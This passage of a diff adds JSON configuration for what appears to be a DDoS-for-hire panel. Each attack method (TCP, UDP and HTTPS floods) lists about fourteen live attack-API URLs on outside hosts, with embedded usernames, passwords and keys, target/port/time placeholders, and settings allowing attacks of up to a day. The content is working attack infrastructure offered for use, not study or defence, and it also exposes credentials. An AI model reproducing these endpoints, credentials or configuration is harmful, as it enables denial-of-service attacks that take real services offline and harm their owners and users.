+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": true,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "TCPBYPASS",
+            "links": [
+      "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=tcpbypass",
+      "http://91.234.199.123/api/8747c479e93a10bd/attack?&target={HOST}&port={PORT}&time={TIME}&method=tcplegit",
+      "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcpbypass",
+       "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=tcpbypass",
+       "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=tcpboom",
+       "http://bulletpunchesme.us/akvii/api.php?username=akvii&key=akvii&host={HOST}&port={PORT}&time={TIME}&method=tcp-rand",
+       "https://polarapi.org/api/attack?&username=akvil&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=TCPBOOM",
+        "http://eu.justhit.me:8080/api/attack?username=xui&password=Akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcp",
+        "https://api.gemininetwork.su/api/attack?username=akvii&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=tcpfuzz",
+        "http://connect-tcp.xyz:8888/api/start?username=Hexon&key=bJTSYRkrNGzxw2i&host={HOST}&port={PORT}&time={TIME}&method=stomp&pps=-1&threads=10",
+        "http://37.221.93.173:9241/api/attack?username=hexon&password=akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcp-vip",
+        "https://kodachi.xyz/api/attack?username=akvii&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=stomp",
+        "http://144.172.67.74:3044/api/attack?key=0bc4eb7f-79ff-4684-962d-60607293e5c5&host={HOST}&port={PORT}&time={TIME}&method=tcprape",
+        "https://api.orbitalstress.su/start?key=qxvi1y-1m0oex&host={HOST}&port={PORT}&time={TIME}&method=TCP-AMP"
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 60,
+                        "enabled": true
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": false,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "HTTPS-NULL",
+            "links": [
+    "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=cloak-https",
+     "http://91.234.199.123/api/8747c479e93a10bd/attack?&target={HOST}&port={PORT}&time={TIME}&method=tls",
+     "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=flooder",
+       "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=HTTPS",
+       "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=tls",
+       "http://bulletpunchesme.us/akvii/api.php?username=akvii&key=akvii&host={HOST}&port={PORT}&time={TIME}&method=bypass",
+       "https://polarapi.org/api/attack?&username=akvil&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=flooder",
+        "http://eu.justhit.me:8080/api/attack?username=xui&password=Akvii123&target={HOST}&port={PORT}&time={TIME}&method=tls",
+        "https://api.gemininetwork.su/api/attack?username=akvii&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=HTTPS",
+        "http://connect-tcp.xyz:8888/api/start?username=Hexon&key=bJTSYRkrNGzxw2i&host={HOST}&port={PORT}&time={TIME}&method=HTTPS&pps=-1&threads=10",
+        "http://37.221.93.173:9241/api/attack?username=hexon&password=akvii123&target={HOST}&port={PORT}&time={TIME}&method=HTTPS",
+        "https://kodachi.xyz/api/attack?username=akvii&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=bypass",
+        "http://144.172.67.74:3044/api/attack?key=0bc4eb7f-79ff-4684-962d-60607293e5c5&host={HOST}&port={PORT}&time={TIME}&method=HTTPS",
+        "https://api.orbitalstress.su/start?key=qxvi1y-1m0oex&host={HOST}&port={PORT}&time={TIME}&method=HTTPS",
+        "https://l7nexus.net/v2/start?api_key=kMNzOSJoOl&user=15940&=target={HOST}&port={PORT}&time={TIME}&method=STORM-BYPASSV2&concurrents=2"
+
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": true,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "HTTPS",
+            "links": [
+      "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=cloak-https",
+       "http://91.234.199.123/api/8747c479e93a10bd/attack?&target={HOST}&port={PORT}&time={TIME}&method=tls",
+       "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=flooder",
+       "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=HTTPS",
+       "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=tls",
+       "http://bulletpunchesme.us/akvii/api.php?username=akvii&key=akvii&host={HOST}&port={PORT}&time={TIME}&method=bypass",
+       "https://polarapi.org/api/attack?&username=akvil&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=flooder",
+        "http://eu.justhit.me:8080/api/attack?username=xui&password=Akvii123&target={HOST}&port={PORT}&time={TIME}&method=tls",
+        "https://api.gemininetwork.su/api/attack?username=akvii&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=HTTPS",
+        "http://connect-tcp.xyz:8888/api/start?username=Hexon&key=bJTSYRkrNGzxw2i&host={HOST}&port={PORT}&time={TIME}&method=HTTPS&pps=-1&threads=10",
+        "http://37.221.93.173:9241/api/attack?username=hexon&password=akvii123&target={HOST}&port={PORT}&time={TIME}&method=HTTPS",
+        "https://kodachi.xyz/api/attack?username=akvii&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=bypass",
+        "http://144.172.67.74:3044/api/attack?key=0bc4eb7f-79ff-4684-962d-60607293e5c5&host={HOST}&port={PORT}&time={TIME}&method=HTTPS",
+        "https://api.orbitalstress.su/start?key=qxvi1y-1m0oex&host={HOST}&port={PORT}&time={TIME}&method=HTTPS",
+        "https://l7nexus.net/v2/start?api_key=kMNzOSJoOl&user=15940&=target={HOST}&port={PORT}&time={TIME}&method=STORM-BYPASSV2&concurrents=2"
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": false,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "tcp-flags",
+            "links": [
+      "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=tcpkill",
+       "http://91.234.199.123/api/8747c479e93a10bd/attack?&target={HOST}&port={PORT}&time={TIME}&method=tcplegit",
+       "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcpbypass",
+       "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=tcpmix",
+       "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=tcpkill",
+       "http://bulletpunchesme.us/akvii/api.php?username=akvii&key=akvii&host={HOST}&port={PORT}&time={TIME}&method=tcp-rand",
+       "https://polarapi.org/api/attack?&username=akvil&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=tcpboom",
+        "http://eu.justhit.me:8080/api/attack?username=xui&password=Akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcp",
+        "https://api.gemininetwork.su/api/attack?username=akvii&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=tcpfuzz",
+        "http://connect-tcp.xyz:8888/api/start?username=Hexon&key=bJTSYRkrNGzxw2i&host={HOST}&port={PORT}&time={TIME}&method=stomp&pps=-1&threads=10",
+        "http://37.221.93.173:9241/api/attack?username=hexon&password=akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcp-vip",
+        "https://kodachi.xyz/api/attack?username=akvii&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=tcpmtu",
+        "http://144.172.67.74:3044/api/attack?key=0bc4eb7f-79ff-4684-962d-60607293e5c5&host={HOST}&port={PORT}&time={TIME}&method=tcprape",
+        "https://api.orbitalstress.su/start?key=qxvi1y-1m0oex&host={HOST}&port={PORT}&time={TIME}&method=tcp-amp"
+
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": true,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        
+        {
+            "method_name": "TCP",
+            "links": [
+     "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=tcpkill",
+      "http://91.234.199.123/api/8747c479e93a10bd/attack?&target={HOST}&port={PORT}&time={TIME}&method=tcplegit",
+      "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcp",
+       "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=tcpmix",
+       "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=tcpkill",
+       "http://bulletpunchesme.us/akvii/api.php?username=akvii&key=akvii&host={HOST}&port={PORT}&time={TIME}&method=tcp-rand",
+       "https://polarapi.org/api/attack?&username=akvil&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=tcpboom",
+        "http://eu.justhit.me:8080/api/attack?username=xui&password=Akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcp",
+        "https://api.gemininetwork.su/api/attack?username=akvii&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=tcpfuzz",
+        "http://connect-tcp.xyz:8888/api/start?username=Hexon&key=bJTSYRkrNGzxw2i&host={HOST}&port={PORT}&time={TIME}&method=stomp&pps=-1&threads=10",
+        "http://37.221.93.173:9241/api/attack?username=hexon&password=akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcp-vip",
+        "https://kodachi.xyz/api/attack?username=akvii&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=tcpmtu",
+        "http://144.172.67.74:3044/api/attack?key=0bc4eb7f-79ff-4684-962d-60607293e5c5&host={HOST}&port={PORT}&time={TIME}&method=tcprape",
+        "https://api.orbitalstress.su/start?key=qxvi1y-1m0oex&host={HOST}&port={PORT}&time={TIME}&method=tcp-amp"
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": false,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "TCP-NULL",
+            "links": [
+     "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=tcpkill",
+      "http://91.234.199.123/api/8747c479e93a10bd/attack?&target={HOST}&port={PORT}&time={TIME}&method=tcplegit",
+      "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcbypass",
+      "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=tcpmix",
+      "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=tcpkill",
+      "http://bulletpunchesme.us/akvii/api.php?username=akvii&key=akvii&host={HOST}&port={PORT}&time={TIME}&method=tcp-rand",
+      "https://polarapi.org/api/attack?&username=akvil&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=tcpboom",
+       "http://eu.justhit.me:8080/api/attack?username=xui&password=Akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcp",
+       "https://api.gemininetwork.su/api/attack?username=akvii&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=tcpfuzz",
+       "http://connect-tcp.xyz:8888/api/start?username=Hexon&key=bJTSYRkrNGzxw2i&host={HOST}&port={PORT}&time={TIME}&method=stomp&pps=-1&threads=10",
+       "http://37.221.93.173:9241/api/attack?username=hexon&password=akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcp-vip",
+       "https://kodachi.xyz/api/attack?username=akvii&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=tcpmtu",
+       "http://144.172.67.74:3044/api/attack?key=0bc4eb7f-79ff-4684-962d-60607293e5c5&host={HOST}&port={PORT}&time={TIME}&method=tcprape",
+       "https://api.orbitalstress.su/start?key=qxvi1y-1m0oex&host={HOST}&port={PORT}&time={TIME}&method=tcp-amp"
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": true,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "UDP-NULL",
+            "links": [
+       "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=udp-destroy",
+       "http://91.234.199.123/api/8747c479e93a10bd/attack?&target={HOST}&port={PORT}&time={TIME}&method=udp",
+       "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=gudp",
+       "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=mixamp",
+       "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=udpbypass",
+       "http://bulletpunchesme.us/akvii/api.php?username=akvii&key=akvii&host={HOST}&port={PORT}&time={TIME}&method=udp",
+       "https://polarapi.org/api/attack?&username=akvil&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=udpboom",
+        "http://eu.justhit.me:8080/api/attack?username=xui&password=Akvii123&target={HOST}&port={PORT}&time={TIME}&method=gudp",
+        "https://api.gemininetwork.su/api/attack?username=akvii&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=udpfuzz",
+        "http://connect-tcp.xyz:8888/api/start?username=Hexon&key=bJTSYRkrNGzxw2i&host={HOST}&port={PORT}&time={TIME}&method=udp&pps=-1&threads=10",
+        "http://37.221.93.173:9241/api/attack?username=hexon&password=akvii123&target={HOST}&port={PORT}&time={TIME}&method=udp-vip",
+        "https://kodachi.xyz/api/attack?username=akvii&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=gudp",
+        "http://144.172.67.74:3044/api/attack?key=0bc4eb7f-79ff-4684-962d-60607293e5c5&host={HOST}&port={PORT}&time={TIME}&method=udp",
+        "https://api.orbitalstress.su/start?key=qxvi1y-1m0oex&host={HOST}&port={PORT}&time={TIME}&method=udp"
+
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": true,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "UDP-RAPE",
+            "links": [
+    "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=udpdrop",
+    "http://91.234.199.123/api/8747c479e93a10bd/attack?&target={HOST}&port={PORT}&time={TIME}&method=udp",
+    "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=gudp",
+    "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=mixamp",
+       "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=udpbypass",
+       "http://bulletpunchesme.us/akvii/api.php?username=akvii&key=akvii&host={HOST}&port={PORT}&time={TIME}&method=udp",
+       "https://polarapi.org/api/attack?&username=akvil&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=udpboom",
+        "http://eu.justhit.me:8080/api/attack?username=xui&password=Akvii123&target={HOST}&port={PORT}&time={TIME}&method=gudp",
+        "https://api.gemininetwork.su/api/attack?username=akvii&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=udpfuzz",
+        "http://connect-tcp.xyz:8888/api/start?username=Hexon&key=bJTSYRkrNGzxw2i&host={HOST}&port={PORT}&time={TIME}&method=udp&pps=-1&threads=10",
+        "http://37.221.93.173:9241/api/attack?username=hexon&password=akvii123&target={HOST}&port={PORT}&time={TIME}&method=udp-vip",
+        "https://kodachi.xyz/api/attack?username=akvii&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=gudp",
+        "http://144.172.67.74:3044/api/attack?key=0bc4eb7f-79ff-4684-962d-60607293e5c5&host={HOST}&port={PORT}&time={TIME}&method=udp",
+        "https://api.orbitalstress.su/start?key=qxvi1y-1m0oex&host={HOST}&port={PORT}&time={TIME}&method=udp"
+
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
